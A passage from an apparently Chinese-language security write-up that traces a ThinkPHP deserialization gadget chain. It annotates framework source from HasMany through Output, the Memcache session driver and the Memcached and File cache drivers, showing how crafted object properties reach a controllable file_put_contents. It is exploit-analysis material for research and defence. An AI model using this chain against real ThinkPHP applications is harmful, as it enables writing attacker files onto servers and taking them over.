<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;query) &#123; <span class="comment">// ✅ $this-&gt;query 不为空，进入判断</span></span><br><span class="line">        <span class="comment">// 执行基础查询</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">baseQuery</span>(); <span class="comment">// 👈 调用 HasMany 的 baseQuery 方法</span></span><br><span class="line">        <span class="comment">// [...]   </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>HasMany-&gt;baseQuery</code> 中经过一些判断会调用 <code>$this-&gt;query-&gt;where</code> 方法。这里我们设置 <code>$this-&gt;query</code> 为 <code>think\console\Output</code> 对象，而 <code>Output</code> 没有 <code>where</code> 方法，因此会调用到 <code>Output-&gt;__call</code> 方法。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">baseQuery</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;baseQuery)) &#123; <span class="comment">// ✅ $this-&gt;baseQuery 设置为空进入判断</span></span><br><span class="line">        <span class="comment">// 设置 $this-&gt;localKey 为一个属性名，例如 &#x27;k&#x27;</span></span><br><span class="line">        <span class="comment">// 设置 $this-&gt;parent 为任意一个对象，例如 stdClass</span></span><br><span class="line">        <span class="comment">// 设置 $this-&gt;parent-&gt;&#123;$this-&gt;localKey&#125; 为一个非空值，例如 0</span></span><br><span class="line">        <span class="comment">// ✅ 通过 isset 检查进入判断</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;localKey&#125;)) &#123; </span><br><span class="line">            <span class="comment">// $this-&gt;query 指向 think\console\Output 对象</span></span><br><span class="line">            <span class="comment">// 📌 调用 Output-&gt;__call 方法，参数是：</span></span><br><span class="line">            <span class="comment">// - $this-&gt;foreignKey：要写入的文件内容，例如 &quot;file_content&quot;</span></span><br><span class="line">            <span class="comment">// - $this-&gt;parent-&gt;&#123;$this-&gt;localKey&#125;：随便设置的非空值，例如 0</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$this</span>-&gt;foreignKey, <span class="variable">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable">$this</span>-&gt;localKey&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;baseQuery = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>和 RCE2 调用链一样，<code>Output-&gt;__call</code> 方法方法将 <code>$method = &#39;where&#39;</code> 插入到参数列表头部之后就会调用自身的 <code>block</code> 方法。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $method = &#x27;where&#x27;, $args = [&#x27;file_content&#x27;, 0]</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 判断 $method 是否在 $this-&gt;styles 列表中</span></span><br><span class="line">    <span class="comment">// ✅ 这里我们设置 $this-&gt;styles = [&#x27;where&#x27;] 从而进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;styles)) &#123;</span><br><span class="line">        <span class="comment">// $method 插入到参数列表 $args 头部</span></span><br><span class="line">        <span class="comment">// $args: [&#x27;file_content&#x27;, 0] =&gt; [&#x27;where&#x27;, &#x27;file_content&#x27;, 0] </span></span><br><span class="line">        <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$method</span>);</span><br><span class="line">        <span class="comment">// 📌 调用 Output-&gt;block 方法，参数是 [&#x27;where&#x27;, &#x27;file_content&#x27;, 0]</span></span><br><span class="line">        <span class="comment">// 不过 Output-&gt;block 接收 2 个参数，因此参数列表最后的元素被忽略</span></span><br><span class="line">        <span class="comment">// 因此实际传参为 [&#x27;where&#x27;, &#x27;file_content&#x27;]</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;block&#x27;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>随后是一条和 RCE2 一样的调用链：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $style = &#x27;where&#x27;, $message = &#x27;file_content&#x27;</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$message</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">writeln</span>(<span class="string">&quot;&lt;<span class="subst">&#123;$style&#125;</span>&gt;<span class="subst">&#123;$message&#125;</span>&lt;/<span class="subst">$style</span>&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 输出信息并换行</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $messages = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int    $type = self::OUTPUT_NORMAL = 0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_NORMAL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$messages</span>, <span class="literal">true</span>, <span class="variable">$type</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 输出信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $messages = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool   $newline = true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int    $type = self::OUTPUT_NORMAL = 0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$newline</span> = <span class="literal">false</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_NORMAL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$messages</span>, <span class="variable">$newline</span>, <span class="variable">$type</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>$this-&gt;handle</code> 被我们设置为 <code>think\session\driver\Memcache</code> 对象，因此和 RCE2 一样，随后会调用该对象的 <code>write</code> 方法。在 <code>write</code> 方法中又会调用 <code>this-&gt;handler-&gt;set</code> 方法，其中 <code>$this-&gt;handler</code> 被设置为 <code>think\cache\driver\Memcached</code> 对象。</p>
<p>由于我们没有设置 <code>Memcache</code> 的 <code>$config</code> 成员的值，因此在设置参数时使用的 <code>$this-&gt;config</code> 是类中定义的默认值。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="variable">$config</span>  = [</span><br><span class="line">    <span class="string">&#x27;host&#x27;</span>         =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment">// memcache主机</span></span><br><span class="line">    <span class="string">&#x27;port&#x27;</span>         =&gt; <span class="number">11211</span>, <span class="comment">// memcache端口</span></span><br><span class="line">    <span class="string">&#x27;expire&#x27;</span>       =&gt; <span class="number">3600</span>, <span class="comment">// session有效期</span></span><br><span class="line">    <span class="string">&#x27;timeout&#x27;</span>      =&gt; <span class="number">0</span>, <span class="comment">// 连接超时时间（单位：毫秒）</span></span><br><span class="line">    <span class="string">&#x27;persistent&#x27;</span>   =&gt; <span class="literal">true</span>, <span class="comment">// 长连接</span></span><br><span class="line">    <span class="string">&#x27;session_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">// memcache key前缀</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写入Session</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string    $sessID = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> String    $sessData = true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sessID</span>, <span class="variable">$sessData</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;session_name&#x27;</span>] . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="number">0</span>, <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;expire&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>think\cache\driver\Memcached</code> 的 <code>set</code> 方法是 <strong>ThinkPHP 缓存系统中的缓存写入函数</strong>，这个函数是 FW1 中最重要的一个函数。</p>
<p>如果我们将 <code>think\cache\driver\Memcached</code> 的 <code>handler</code> 成员指向 <code>think\cache\driver\File</code> 对象并精心构造，那么我们可以先把这个函数的功能简单理解为一个文件写入函数，其中：</p>
<ul>
<li>将第 <code>$this-&gt;handler-&gt;options[&#39;path&#39;]</code>  与一个参数 <code>$name</code> 的 MD5 与简单拼接后加上 <code>.php</code> 后缀作为<strong>文件名</strong>。</li>
<li>将第二个参数 <code>$value</code> 序列化后与其他数据简单拼接之后作为<strong>文件内容</strong>。</li>
</ul>
<p>然而当我们调用到 <code>set</code> 方法时，我们只能控制第一个参数，而第二个作为文件内容的参数不可控。因此我们还需要分析一下 <code>set</code> 的过程看一下有没有可以控制文件内容的方法。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写入缓存</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string            $name 缓存变量名 = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed             $value  存储数据 = true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> integer|\DateTime $expire  有效时间（秒）= 0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ❌ $expire 不为 null，不进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ❌ $expire 不是 DateTime 的实例，不进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果没有 $name 对应的缓存文件则 $this-&gt;has($name) 返回 false</span></span><br><span class="line">    <span class="comment">// ✅ 因此进入判断设置 $first = true</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 因为 $this-&gt;options[&#x27;prefix&#x27;] = &#x27;&#x27; 所以 getCacheKey 直接返回 $name</span></span><br><span class="line">    <span class="comment">// 因此这里等价于 $key = $name</span></span><br><span class="line">    <span class="variable">$key</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 0 == $expire 满足条件因此 $expire = 0</span></span><br><span class="line">    <span class="variable">$expire</span> = <span class="number">0</span> == <span class="variable">$expire</span> ? <span class="number">0</span> : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_TIME&#x27;</span>] + <span class="variable">$expire</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 📌 首先调用 $this-&gt;handler-&gt;set 第一次写入文件，此处文件内容不可控。</span></span><br><span class="line">    <span class="comment">// $key = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27; 经过转换变为文件名</span></span><br><span class="line">    <span class="comment">// $value = true 经过序列化和拼接等操作变成文件内容</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$expire</span>)) &#123;</span><br><span class="line">        <span class="comment">// 由于前面设置 $first = true</span></span><br><span class="line">        <span class="comment">// 因此调用 $this-&gt;setTagItem → $this-&gt;set 再次调用到这个函数</span></span><br><span class="line">        <span class="comment">// 由于此时经过参数转换后文件内容作为第二个参数传入</span></span><br><span class="line">        <span class="comment">// 📌 因此 $this-&gt;handler-&gt;set 完成第二次写入时文件内容可控</span></span><br><span class="line">        <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在  <code>set</code> 函数中真正进行文件写入操作是通过调用 <code>$this-&gt;handler-&gt;set</code> 完成的。当 <code>handler</code> 成员指向 <code>think\cache\driver\File</code> 对象时，对应的 <code>$this-&gt;handler-&gt;set</code> 函数如下：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写入缓存</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string            $name 缓存变量名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed             $value  存储数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> integer|\DateTime $expire  有效时间（秒）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">        <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">        <span class="variable">$expire</span> = <span class="variable">$expire</span>-&gt;<span class="title function_ invoke__">getTimestamp</span>() - <span class="title function_ invoke__">time</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将 $name 转换成要保存的文件的路径，第二个参数表示是否创建目录</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $this-&gt;tag = true 且文件不存在则表示第一次创建，$first = true</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将要写入的值 $value 序列化一下</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果 $this-&gt;options[&#x27;data_compress&#x27;] = true 则会将数据压缩</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将要写入的数据和一段 PHP 代码拼接</span></span><br><span class="line">    <span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 向 $filename 文件写入数据 $data</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果成功写入数据</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果是第一次写入则会调用 think\cache\Driver 的 setTagItem 方法更新标签</span></span><br><span class="line">        <span class="comment">// 这个方法会调用 $this-&gt;set 函数再次进行文件写入</span></span><br><span class="line">        <span class="comment">// 且此时第二个参数可以设置为这里传入的 $filename</span></span><br><span class="line">        <span class="comment">// 言外之意就是我们可以通过这里的 $filename 控制写入内容</span></span><br><span class="line">        <span class="comment">// 然而这里的 $filename 是要写入内容的 md5 拼接出来的，不可控</span></span><br><span class="line">        <span class="comment">// 因此不会使用这里的调用点构造反序列化链，也就是 $this-&gt;tag = false</span></span><br><span class="line">        <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="title function_ invoke__">clearstatcache</span>(); <span class="comment">// 更新文件缓存</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>$this-&gt;handler-&gt;set</code> 函数首先会对 <code>$expire</code> 做一些判断和转换，但是由于我们传入的是数字，因此实际上并没有什么变化。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">    <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">    <span class="variable">$expire</span> = <span class="variable">$expire</span>-&gt;<span class="title function_ invoke__">getTimestamp</span>() - <span class="title function_ invoke__">time</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后会调用父类 <code>Driver</code> 的 <code>getCacheKey</code> 方法将传入的第一个参数 <code>$name</code> 转换为要写入的文件的名字。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 取得变量的存储文件名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name 缓存变量名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  bool   $auto 是否自动创建目录</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$auto</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>); <span class="comment">// 对 $name 算一次 md5</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ❌ $this-&gt;options[&#x27;cache_subdir&#x27;] = &#x27;&#x27; 不进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>]) &#123;</span><br><span class="line">        <span class="comment">// 使用子目录</span></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">2</span>) . DS . <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ❌ $this-&gt;options[&#x27;prefix&#x27;] = &#x27;&#x27; 不进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . DS . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $this-&gt;options[&#x27;path&#x27;] 是我们设置的路径，会拼接上 md5($name) 和 